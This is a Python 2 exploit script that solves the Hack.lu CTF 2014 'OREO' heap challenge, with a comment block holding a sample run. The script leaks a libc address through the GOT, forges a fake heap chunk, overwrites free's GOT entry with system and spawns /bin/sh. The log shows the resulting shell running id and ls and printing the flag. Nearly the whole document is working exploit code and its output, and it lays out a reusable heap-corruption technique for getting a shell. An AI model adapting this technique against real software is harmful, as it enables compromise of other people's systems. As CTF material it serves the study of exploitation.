#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# Hack.lu CTF 2014 - OREO (Pwn 400)
# --------------------------------------------------------------------------------------------------
import struct
import sys

# --------------------------------------------------------------------------------------------------
def add_rifle(name, desc):                  # add a new rifle
    print '1\n' + name + '\n' + desc 

# --------------------------------------------------------------------------------------------------
def leave_msg(msg):                         # leave a message
    print '4\n' + msg

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    
    
    # leak address of .got.fgets (0x0804A23c)
    # note that rifle.prev is NULL (0x0804A23c+0x38)
    add_rifle('k'*0x1b + struct.pack("<L", 0x0804A23c), 'foo')

    print '2'                               # print riffles to get &fgets()

    # 2 rifles will be printed. The description of the 2nd will be the required address
    
    fgets  = 0xf7e67220                     # this should be leaked
    system = 0xF7E42360                     # calculate &system 
    # -----------------------------------------------------------------------------------       
    leave_msg('\0'*36 + '\x21' + '\0'*16)   # create a fake 'next' chunk
    
    for i in range(0x41-2):                 # add dummy riffles to make rifle counter = 0x41
        add_rifle('foo', 'bar')

    # last rifle will point to our fake chunk. Fake chunk start from 0x804a2a4 
    # (rifle_counter_804A2A4) and the returned address is 0x804a2a8 (8 byte aligned)
    add_rifle('k'*0x1b + struct.pack("<L", 0x0804A2A8), 'foo')

    print '3'                               # delete all rifles and call free(0x0804A2A8)
    
    # -----------------------------------------------------------------------------------       
    # overwrite order_message_ptr_804A2A8 with .got.fgets()
    add_rifle('foo', struct.pack("<L", 0x0804A238))

    # overwrite .got.free with system() and fix .got.fgets()
    leave_msg( struct.pack("<L", system) + struct.pack("<L", fgets))    

    # write /bin/sh into the right place
    add_rifle('foo', '/bin/sh' + '\x00'*0x30)

    print '3'                               # trigger system("/bin/sh")

    exit(0) 
# --------------------------------------------------------------------------------------------------
'''
root@nogirl:~/ctf/hack-lu_14# (./oreo_expl.py; cat)  | ./oreo_35f118d90a7790bbd1eb6d4549993ef0 
    Welcome to the OREO Original Rifle Ecommerce Online System!

         ,______________________________________
        |_________________,----------._ [____]  -,__  __....-----=====
                       (_(||||||||||||)___________/                   |
                          `----------'   OREO [ ))"-,                   |
                                               ""    `,  _,--....___    |
                                                       `/           """"
        
    What would you like to do?

    1. Add new rifle
    2. Show added rifles
    3. Order selected rifles
    4. Leave a Message with your Order
    5. Show current stats
    6. Exit!
    Action: Rifle name: Rifle description: Action: Rifle to be ordered:
    ===================================
    Name: kkkkkkkkkkkkkkkkkkkkkkkkkkk<�
    Description: foo
    ===================================
    Name: ���
    Description:  r��������
    ===================================
    Action: Enter any notice you'd like to submit with your order: Action: Rifle name: 
    Rifle description: Action: Rifle name: Rifle description: Action: Rifle name: 
    id
        uid=1000(oreo) gid=1000(oreo) groups=1000(oreo)
    ls -l
    total 12
        -rw-r--r-- 1 root root   35 Oct  7 14:54 fl4g
        -rwxr-xr-x 1 oreo oreo 6172 Oct  7 14:47 oreo
    cat fl4g
        flag{FASTBINS_ARE_NICE_ARENT_THEY}

'''
# --------------------------------------------------------------------------------------------------
